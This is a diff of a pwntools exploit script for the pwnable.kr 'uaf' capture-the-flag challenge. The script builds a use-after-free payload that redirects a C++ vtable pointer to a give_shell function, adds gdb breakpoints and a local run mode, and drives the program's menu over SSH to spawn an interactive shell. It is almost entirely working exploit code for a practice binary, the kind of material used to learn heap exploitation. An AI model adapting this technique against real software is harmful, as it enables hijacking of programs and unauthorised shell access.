@@ -23,33 +23,46 @@ At +0 contains the address of give_shell. Thus if we use 0x401570-8 = 0x401568, 
 
 We need to add our payload two times, since else only the woman instance is overwritten, and
 calling man will crash.
-
-I had a lot of troubles trying to debug this in gdb. Maybe GDB changes the program flow, because
-whatever I sent in the payload, even of size 24, did not make a difference.
 """
 
 pwn.context.terminal = ["tmux", "splitw", "-h"]
 exe = pwn.context.binary = pwn.ELF('./uaf')
 
 random_file = "/tmp/%s" % pwn.util.fiddling.randoms(10)
-size_of_new = 24
+size_of_new = 8
 payload_length = size_of_new
-payload = pwn.p32(0x401568) + b'a' * (size_of_new - 4)
-print(pwn.hexdump(payload))
+address_of_virtual_address_table = 0x401570
+payload = pwn.p64(address_of_virtual_address_table - 8) + b'a' * (size_of_new - 8)
+pwn.debug(pwn.hexdump(payload))
+
+gdbscript = '''
+# Before "delete m;"
+break *0x00401082
+
+# before "m->introduce();"
+break *0x00400fe2
+
+# before "new"
+break *0x00401020
+continue
+'''
 
 if pwn.args.GDB:
     pwn.write('/tmp/payload', payload)
-    p = pwn.gdb.debug([exe.path, str(payload_length), random_file])
+    p = pwn.gdb.debug([exe.path, str(payload_length), '/tmp/payload'], gdbscript=gdbscript)
+elif pwn.args.LOCAL:
+    pwn.write('/tmp/payload', payload)
+    p = pwn.process([exe.path, str(payload_length), '/tmp/payload'])
 else:
     io = pwn.ssh("uaf", "pwnable.kr", 2222, "guest")
     io.upload_data(payload, random_file)
     p = io.process(["./uaf", str(payload_length), random_file])
+
 p.recvuntil('1. use\n2. after\n3. free\n')
 p.sendline('3')
-p.recvuntil('1. use\n2. after\n3. free\n')
-p.sendline('2')
-p.recvuntil('1. use\n2. after\n3. free\n')
-p.sendline('2')
+for x in range(0, 2):
+    p.recvuntil('1. use\n2. after\n3. free\n')
+    p.sendline('2')
 p.recvuntil('1. use\n2. after\n3. free\n')
 p.sendline('1')
 p.interactive()
